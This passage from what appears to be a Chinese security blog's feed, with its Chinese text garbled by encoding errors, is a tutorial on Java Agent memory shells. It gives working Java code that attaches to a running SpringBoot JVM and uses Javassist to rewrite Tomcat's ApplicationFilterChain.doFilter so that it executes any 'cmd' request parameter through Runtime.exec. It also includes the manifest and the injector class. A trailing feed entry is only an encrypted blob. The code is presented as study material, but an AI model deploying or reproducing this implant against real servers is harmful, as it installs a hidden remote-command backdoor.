<span class="comment">//è¿”å›ç›®æ ‡ç±»å­—èŠ‚ç   </span></span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();  </span><br><span class="line">            <span class="keyword">return</span> bytes;  </span><br><span class="line">  </span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®Œæ¯•ä¹‹åæ‰“åŒ… Java Agent åŒ…ï¼Œè¿™é‡Œæœ‰ä¸ªå‘ç‚¹æ˜¯ <code>MAINFEST.MF</code> éœ€è¦ä¿®æ”¹å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span>  </span><br><span class="line">Agent-Class: AgentShell.agentmain_transform  </span><br><span class="line">Can-Redefine-Classes: <span class="literal">true</span>  </span><br><span class="line">Can-Retransform-Classes: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>æœ€åç¼–å†™åŠ¨æ€æ³¨å…¥ Agent çš„æ³¨å…¥ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Inject_Agent</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException &#123;  </span><br><span class="line">        <span class="comment">//è°ƒç”¨VirtualMachine.list()è·å–æ­£åœ¨è¿è¡Œçš„JVMåˆ—è¡¨  </span></span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();  </span><br><span class="line">        <span class="keyword">for</span>(VirtualMachineDescriptor vmd : list)&#123;  </span><br><span class="line">            System.out.println(vmd.displayName());  </span><br><span class="line">            <span class="comment">//éå†æ¯ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„JVMï¼Œå¦‚æœJVMåç§°ä¸ºSleep_Helloåˆ™è¿æ¥è¯¥JVMå¹¶åŠ è½½ç‰¹å®šAgent  </span></span><br><span class="line">            <span class="keyword">if</span>(vmd.displayName().equals(<span class="string">&quot;AgentShell.Sleep_Hello&quot;</span>))&#123;  </span><br><span class="line">  </span><br><span class="line">                <span class="comment">//è¿æ¥æŒ‡å®šJVM  </span></span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">virtualMachine</span> <span class="operator">=</span> VirtualMachine.attach(vmd.id());  </span><br><span class="line">                <span class="comment">//åŠ è½½Agent  </span></span><br><span class="line">                virtualMachine.loadAgent(<span class="string">&quot;E:\\Coding\\Java\\Java-Agent-Memshell\\Instrumentation\\target\\Instrumentation-1.0-SNAPSHOT-jar-with-dependencies.jar&quot;</span>);  </span><br><span class="line">                <span class="comment">//æ–­å¼€JVMè¿æ¥  </span></span><br><span class="line">                virtualMachine.detach();  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœ</p><img src="/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/InjectAgentSuccess.png" class><h3 id="Instrumentation-çš„å±€é™æ€§"><a href="#Instrumentation-çš„å±€é™æ€§" class="headerlink" title="Instrumentation çš„å±€é™æ€§"></a>Instrumentation çš„å±€é™æ€§</h3><p>å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä½¿ç”¨ Instrumentation éƒ½æ˜¯ä½¿ç”¨å…¶å­—èŠ‚ç æ’æ¡©çš„åŠŸèƒ½ï¼Œç®€å•æ¥è¯´å°±æ˜¯ç±»é‡å®šä¹‰åŠŸèƒ½ï¼ˆClass Redefineï¼‰ï¼Œä½†æ˜¯æœ‰ä»¥ä¸‹å±€é™æ€§ï¼š</p><p>premain å’Œ agentmain ä¸¤ç§æ–¹å¼<strong>ä¿®æ”¹å­—èŠ‚ç </strong>çš„æ—¶æœºéƒ½æ˜¯ç±»æ–‡ä»¶åŠ è½½ä¹‹åï¼Œä¹Ÿå°±æ˜¯è¯´å¿…é¡»è¦å¸¦æœ‰ Class ç±»å‹çš„å‚æ•°ï¼Œä¸èƒ½é€šè¿‡å­—èŠ‚ç æ–‡ä»¶å’Œè‡ªå®šä¹‰çš„ç±»åé‡æ–°å®šä¹‰ä¸€ä¸ªæœ¬æ¥ä¸å­˜åœ¨çš„ç±»ã€‚</p><p>ç±»çš„å­—èŠ‚ç ä¿®æ”¹ç§°ä¸ºç±»è½¬æ¢ (Class Transform)ï¼Œç±»è½¬æ¢å…¶å®æœ€ç»ˆéƒ½å›å½’åˆ°ç±»é‡å®šä¹‰ <code>Instrumentation#redefineClasses</code> æ–¹æ³•ï¼Œæ­¤æ–¹æ³•æœ‰ä»¥ä¸‹é™åˆ¶ï¼š</p><ol><li>æ–°ç±»å’Œè€ç±»çš„çˆ¶ç±»å¿…é¡»ç›¸åŒ</li><li>æ–°ç±»å’Œè€ç±»å®ç°çš„æ¥å£æ•°ä¹Ÿè¦ç›¸åŒï¼Œå¹¶ä¸”æ˜¯ç›¸åŒçš„æ¥å£</li><li>æ–°ç±»å’Œè€ç±»è®¿é—®ç¬¦å¿…é¡»ä¸€è‡´ã€‚ æ–°ç±»å’Œè€ç±»å­—æ®µæ•°å’Œå­—æ®µåè¦ä¸€è‡´</li><li>æ–°ç±»å’Œè€ç±»æ–°å¢æˆ–åˆ é™¤çš„æ–¹æ³•å¿…é¡»æ˜¯ private static&#x2F;final ä¿®é¥°çš„</li><li>å¯ä»¥ä¿®æ”¹æ–¹æ³•ä½“</li></ol><h2 id="Agent-å†…å­˜é©¬å®æˆ˜"><a href="#Agent-å†…å­˜é©¬å®æˆ˜" class="headerlink" title="Agent å†…å­˜é©¬å®æˆ˜"></a>Agent å†…å­˜é©¬å®æˆ˜</h2><p>æ¯”å¦‚è¿™é‡Œæˆ‘ä»¬èµ·ä¸€ä¸ª SpringBoot çš„æœåŠ¡ï¼Œç”±äº Tomcat çš„è´£ä»»é“¾æœºåˆ¶ï¼Œå¯ä»¥çœ‹åˆ°ä¼šæŒ‰ç…§è´£ä»»é“¾æœºåˆ¶åå¤è°ƒç”¨ <code>ApplicationFilterChain#doFilter()</code> æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span>( Globals.IS_SECURITY_ENABLED ) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">ServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> request;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">ServletResponse</span> <span class="variable">res</span> <span class="operator">=</span> response;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                java.security.AccessController.doPrivileged(</span><br><span class="line">                        (java.security.PrivilegedExceptionAction&lt;Void&gt;) () -&gt; &#123;</span><br><span class="line">                            internalDoFilter(req,res);</span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                );</span><br><span class="line">            &#125; ...</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            internalDoFilter(request,response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è·Ÿåˆ° <code>internalDoFilter()</code> æ–¹æ³•ä¸­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">internalDoFilter</span><span class="params">(ServletRequest request,</span></span><br><span class="line"><span class="params">                                  ServletResponse response)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Call the next filter if there is one</span></span><br><span class="line">        <span class="keyword">if</span> (pos &lt; n) &#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šä¸¤ä¸ªæ–¹æ³•å‡æ‹¥æœ‰ ServletRequest å’Œ ServletResponseï¼Œå¹¶ä¸” hook ä¸ä¼šå½±å“æ­£å¸¸çš„ä¸šåŠ¡é€»è¾‘ï¼Œå› æ­¤å¾ˆé€‚åˆä½œä¸ºå†…å­˜é©¬çš„å›æ˜¾ã€‚ä¸‹é¢æˆ‘ä»¬å°è¯•åˆ©ç”¨</p><h3 id="åˆ©ç”¨-Java-Agent-å®ç°-Spring-Filter-å†…å­˜é©¬"><a href="#åˆ©ç”¨-Java-Agent-å®ç°-Spring-Filter-å†…å­˜é©¬" class="headerlink" title="åˆ©ç”¨ Java Agent å®ç° Spring Filter å†…å­˜é©¬"></a>åˆ©ç”¨ Java Agent å®ç° Spring Filter å†…å­˜é©¬</h3><p>æˆ‘ä»¬å¤ç”¨ä¸Šé¢çš„ agentmain-Agentï¼Œä¿®æ”¹å­—èŠ‚ç çš„å…³é”®åœ¨äº <code>transformer()</code> æ–¹æ³•ï¼Œå› æ­¤æˆ‘ä»¬é‡å†™è¯¥æ–¹æ³•å³å¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Filter_Transform</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">//è·å–CtClass å¯¹è±¡çš„å®¹å™¨ ClassPool            ClassPool classPool = ClassPool.getDefault();  </span></span><br><span class="line">  </span><br><span class="line">            <span class="comment">//æ·»åŠ é¢å¤–çš„ç±»æœç´¢è·¯å¾„  </span></span><br><span class="line">            <span class="keyword">if</span> (classBeingRedefined != <span class="literal">null</span>) &#123;  </span><br><span class="line">                <span class="type">ClassClassPath</span> <span class="variable">ccp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(classBeingRedefined);  </span><br><span class="line">                classPool.insertClassPath(ccp);  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">//è·å–ç›®æ ‡ç±»  </span></span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">//è·å–ç›®æ ‡æ–¹æ³•  </span></span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;doFilter&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">//è®¾ç½®æ–¹æ³•ä½“  </span></span><br><span class="line">            <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot;javax.servlet.http.HttpServletRequest request = $1\n;&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot;String cmd=request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot;if (cmd !=null)&#123;\n&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot;  Runtime.getRuntime().exec(cmd);\n&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot;  &#125;&quot;</span>+  </span><br><span class="line">                    <span class="string">&quot;&#125;&quot;</span>;  </span><br><span class="line">            ctMethod.setBody(body);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">//è¿”å›ç›®æ ‡ç±»å­—èŠ‚ç   </span></span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();  </span><br><span class="line">            <span class="keyword">return</span> bytes;  </span><br><span class="line">  </span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†å‡†å¤‡ <code>MAINFEST.MF</code> é…ç½®ï¼Œä»¥åŠ agent ä¸»ç±»ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">agentmain_transform</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String args, Instrumentation inst)</span> <span class="keyword">throws</span> InterruptedException, UnmodifiableClassException &#123;  </span><br><span class="line">        Class [] classes = inst.getAllLoadedClasses();  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//è·å–ç›®æ ‡JVMåŠ è½½çš„å…¨éƒ¨ç±»  </span></span><br><span class="line">        <span class="keyword">for</span>(Class cls : classes)&#123;  </span><br><span class="line">            <span class="keyword">if</span> (cls.getName().equals(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>))&#123;  </span><br><span class="line">  </span><br><span class="line">                <span class="comment">//æ·»åŠ ä¸€ä¸ªtransformeråˆ°Instrumentationï¼Œå¹¶é‡æ–°è§¦å‘ç›®æ ‡ç±»åŠ è½½  </span></span><br><span class="line">                inst.addTransformer(<span class="keyword">new</span> <span class="title class_">Filter_Transform</span>(),<span class="literal">true</span>);  </span><br><span class="line">                inst.retransformClasses(cls);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>MAINFEST.MF</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span>  </span><br><span class="line">Agent-Class: com.drunkbaby.agentmain_transform</span><br><span class="line">Can-Redefine-Classes: <span class="literal">true</span>  </span><br><span class="line">Can-Retransform-Classes: <span class="literal">true</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æœ€åå‡†å¤‡ Inject ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Inject_Agent</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException &#123;  </span><br><span class="line">        <span class="comment">//è°ƒç”¨VirtualMachine.list()è·å–æ­£åœ¨è¿è¡Œçš„JVMåˆ—è¡¨  </span></span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();  </span><br><span class="line">        <span class="keyword">for</span>(VirtualMachineDescriptor vmd : list)&#123;  </span><br><span class="line">            System.out.println(vmd.displayName());  </span><br><span class="line">            <span class="comment">//éå†æ¯ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„JVMï¼Œå¦‚æœJVMåç§°ä¸ºSleep_Helloåˆ™è¿æ¥è¯¥JVMå¹¶åŠ è½½ç‰¹å®šAgent  </span></span><br><span class="line">            <span class="keyword">if</span>(vmd.displayName().contains(<span class="string">&quot;JavaAgentSpringBootApplication&quot;</span>))&#123;  </span><br><span class="line">  </span><br><span class="line">                <span class="comment">//è¿æ¥æŒ‡å®šJVM  </span></span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">virtualMachine</span> <span class="operator">=</span> VirtualMachine.attach(vmd.id());  </span><br><span class="line">                <span class="comment">//åŠ è½½Agent  </span></span><br><span class="line">                virtualMachine.loadAgent(<span class="string">&quot;E:\\Coding\\Java\\JavaSecurityLearning\\JavaSecurity\\MemoryShell\\Java-Agent-Memshell\\AgentInjectionExample\\target\\AgentInjectionExample-1.0-SNAPSHOT-jar-with-dependencies.jar&quot;</span>);  </span><br><span class="line">                <span class="comment">//æ–­å¼€JVMè¿æ¥  </span></span><br><span class="line">                virtualMachine.detach();  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨å…¥æˆåŠŸ</p><img src="/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/InjectSpringAgent.png" class><p>æ€»è€Œè¨€ä¹‹çš„æ”»å‡»é¢åº”è¯¥æ˜¯æ³¨å…¥åˆ° JVM è¿›ç¨‹ä¸­</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æ¯”èµ·ä¼ ç»Ÿçš„ Tomcat å†…å­˜é©¬ï¼ŒAgent å†…å­˜é©¬åœ¨å®ç°å½¢å¼ä¸Šå…¶å®è¿˜æ˜¯æ‰“çš„ Tomcat å†…å­˜é©¬ã€‚ç„¶è€Œå®ƒçš„å®ç°è§’åº¦æ˜¯é€šè¿‡éå†æ‰€æœ‰çš„ JVM è¿›ç¨‹ï¼Œç„¶åå‘è¿›ç¨‹ä¸­å»æ³¨å…¥å¯¹åº”çš„ agent ç±»çš„ã€‚åœ¨ agent ç±»ä¸­é€šè¿‡ <code>ClassPool</code> ç”Ÿæˆæ¶æ„ä»£ç </p><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><p><a class="link" href="https://goodapple.top/archives/1355">https://goodapple.top/archives/1355<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
    <summary type="html">Java Agent å†…å­˜é©¬</summary>
    
    
    
    <category term="Java" scheme="https://drun1baby.github.io/categories/Java/"/>
    
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>CVE Apply For OpenWBS Productions</title>
    <link href="https://drun1baby.github.io/2023/11/30/CVE-Apply-For-OpenWBS-Productions/"/>
    <id>https://drun1baby.github.io/2023/11/30/CVE-Apply-For-OpenWBS-Productions/</id>
    <published>2023-11-30T06:21:58.000Z</published>
    <updated>2023-12-04T02:55:06.421Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="3c0968a9a6ed77a1dd8d93580b7365bb9facbcc6f69d0d61fefd08fa43830035">99344be805abc5f525a7b74bfe5c03f0207f0698ac7f51d899ece4e43e874a995bdc26b9a82a38881f7ff135b185f6b94deb2c335212c90832ea1b03b727780300c6e26ee7209d96a223e20996c056261dc5ece39421079097127cd2fc16727742dc6b4f6d798037208f62f607e8cfd86367a2b3e3a428f8f27d7da5fa5c800101ad976361be02a39ec2f426d2fc6e7b087ad6964b6f3e2e67bd7ac41a860dac51fc5e2e2939a00f03a6516a24239bb53de87734385b8210a18a175b9d39b48e55ab40b2b1d448233b11b79170e3d4659ea9d23dfcaf7fb912144c336353bca9d6ac7b48f21c104f27594083d4070b16944ab9400386ec7fea7a615f854ceff92ae21f00e39953737860a05f4181d4acc6a701c6fcc4ad2f6249eea13fc37b95f59d0a7a65f9a81298297070330539a8b996250bccd92b401dd3b62c2a2b532058ff87577128b81a6bff07cd402b9ec98952db58d90f8abfd14adebca7042a48c389dd83954adbc3e99370c4c9e15bc8e3c95fdc8fda79be08240466e48ec71ac8e2eedd0acd515de7912ccfc8dcce9a24d38eb24dd8d1f77b9f340118974a59440310a55db2bf9589cc09b94805952031dd1bfda170408d25be7dec47797a4df96873de7e10d802d17e39bdc4efc740aacf8a93cd52c56cd6abc792c2835286c2e282f9b45ad3385f252be8a4b09f043b195c64ddae164badbd01c1f8845714ab9754989d9ad660afba23dbad25a0fc5f693ea090e0ff69570fa4bdd1b3cff0bd91446cc28f42f6362e0dee14678cc1795e8583cb21b7ad452e5bb7fa8216edc12125e9e6c1421dd224231a74a35b0d875f26cd278f1fccfd71a06b161c9fa13fd90d914b4e6dbc0f54a123dc167ff55f28602449966f925add0029cbd2459b8be65eb1408237c24ab45e7c2778694df96833a40574eb4b24a1f44a4b7b98c5062e234ae928044d400cc6458e3e724e80d00aa53c00702ee24cf2702a03e8b7f4815806d6ef7448b37682ad3b52c8b82463ee6091fe9a0d1a934ec146adf430b6c33b639c007979af2d4544181ffbf795e540ca1e102f1b046397dd771dda90bc880c4e524eb200c25d6b29bd18eaa6b79598427027bca71fdbb0ad3168fe7dcd5b509bf3421ec5d74faebd3d9b2377e96b026dd466c276e9014757d77bcbf1118aebd2e19355ad141b4e7e80966c427133365c5b5f1ccd9aa4939aa3c3cc4dc05aa4fb990077837b8ed559ad184b2593968ea0b626345288f7bdc170d242246f04f48cba8a29c31dbc3ac3ccd70cba08094181f783785be8a70332b1ec5e1667ac8e011d4847a17c56e1bbeb17a802837d9fbd4442ade3000ffc89fbe66eadd476c1990623c8bae0379a12bef2849052e0d9163f9f69cad8f481045d9536939d6c09de1429a94ae32da8cf5aa67059ed53236a5c731c62f91baa7bfe6ec9386dc4fcc6d60ece5c6a786e387db224fb241367d53088b095cf1c7a0344b637222e51a7d8ab8f50939c5fc8d209f9c9d980d44828fe836b25f826d1ed5b691bfa231d5c1aa2900b5f871c301e7646f984dbeed143f2c99602553f279ddf32d8b29e21d91fe3c142f3d406057a4db1813260e9091d107170b0ddce6ac7064f617a9e53fb04f678ca869c02727c67c99cc5535f192bd670e903a9a79e9dc670f4f94ceade5d6ee7596ac5d4461232f5bcce4cad83ae277fb0fb63ecf3ba5d8dd387abbab385b1a3d8104f2b2f32e9008a9119f6d5b96f31bc95edf13bb157b5418ee55dca02219e5105073e06ad8400192e402f553de76fb372feff215935dfb157de3f6dd000fa19d7967137702cf02343f95b4265ed905d9823851ba4493c106db9ae886b65d0b08a3d5d37065192a387121e69b10a8e5027bbb9ce32b573b81cfaf149aa87866a26547f7bab4648f6cd1312e8cce1b37a605d2cfa9eef6813211dbd170d6075e9bfc5ade5a17164343f2f33d3227bcc45290efe7cbce41b2e41026da88c5a5e761e7a4ac137c23c8066a49d06f947ac6c0aa4ede7056d2df896d60bd22e240f41247fa98e7e4a708515f00286961bb09d491a75be87805bca72be770972ec899d2c401946d34f685d460c2af40a60913b897c213a304e60af43a1e3def206bf167cd750f3888e99f87042f7f77e73560951c05833d5550a28cd0a24973def3c7083718f686af07abf4cdd2e271d1fca56680fc64b668df0ff5b668b27d6a500b8cc977360728de5c2d7b14d1c9486e8bfd8fec4a08fbe36405e059240ecc3cedd5c0b2177f168a65077c9d4dc8872fb0a0c81c5c68d40415964cf5fa32b8c0daf93467a7b4b2b28a74af656af0249e10c7972fe4c9e36011ca8f6c4dba4ea967909976b701bb3723aa29bdd5877889e9ffbf8ba218035cb51c7dac422340be68e91a8f664a2aa7fda53c26c66596f0af62f03fc838b03d5361dbe672fbf2da7e8107048ebfdcf9a09d4b3874396cd613da0ee4b86114ef19441a8ba2aa99f58bc5bb9bb82f396499d8e47ebdb1bfb914d6a7509d3a778104b7c36f0dab5d19352625458af4f803b6d908ee1b3a5b30e60404ae63d1a24d922adb2f6bd1a7eb9943ab9d24097baa3f73a855786b04551893c4624f9dc1a24474d7c7b6f3167c6d98348741aa5b31fc0816aba9bc5f4207a3e4a1819bae0c4e3ba03873709cbafc4faea46bd6dfe2b3df05106773fd6e556f64d007cd8306d25dbeb0d2afc8e524996eee79a6798510a5f66fd736174975683a93da1deb2275104a9088229db1f5f93f84371c128b0ea19506bba4d061e332b3c67a5e236bce890fea72319c7a50307c10fb2939f05b9f30647ab6811321c60c438878c107d646e17677757f49955bfd60ce7318bf9510fc102dc7a6b08b1130fc81f19104c0d34aa3f2d81d8ce70775bd49ed459fc733092ff1dc3b7322839747abf397d967b4ad307b7064ddfc398317bbb4c60d6b4691af98d1e8e65bd7b580f5ba3ed1ce313c69c1fdb773b6a685b1016b048de03dfbeea967d9fb1106ff664bcef1ee615f63b7612aaac1435855a75cf9dc80c97ca16a64bb3b0bad9bf344a06ee0fdc8ca4020e6eae697b5163fcd013962170fcf94834870c856d509d3b65c43cdf3b4316eded6a5e1ffade7f132fb21ecb960dda7d956a6e2aafe8a8260fe659fa24a4e51797114aa3995027dd7c9f14506efbb1237f1e6e133214ec2d2704c5401b43405792cfca85de675780fca4d941da82b12ebd5a239ec5bdaec0bad40a22bad7e5df633e9b587e537dacdc617a35294fbd5592cb859c0f9555a5a7ace032ef948bc77df064ee945f5b0bd867d22329534e2ab8a93a306e5a6fff39c9ed64845ceccf63aab4e753b8daf0b57dce087b69c93aca849b8cba6d7893235745c91934fda606128391711719ccfdac53f49452a53737ee0bd1992ffc6b32a21243e25626c367bc18c326b5d366b9918929ed5e90fcc1170633db1346112fe45091e54a67019aa20707dbdc0f67d2d782888f80bfb6cfdb2144299393df20b0fadeeec5b24da1035fe424131634a3f5d4852eef38b1b3c5e2ab4de8f5379f2b454554f57c5d6c9a7a4e1b07f4a098d18e7be9cb2ee8173af292c24e2fb49bbe90d60510339fcf348b1f4a711ba0f338566b4a998e3c2916643544a2ae2535a0030e065ea1ecad9ba266f3f79236112bb8fa2970afc882c7c50bfe7ee7594e4a8b6512f3e4b6e56fccd89da2eb657fd0793ee2bac39aa467d41d8ade78b460beba2303ab95df4a1837b1d271c8ed31a0ded81c55894970e1cb7912a2a555d2230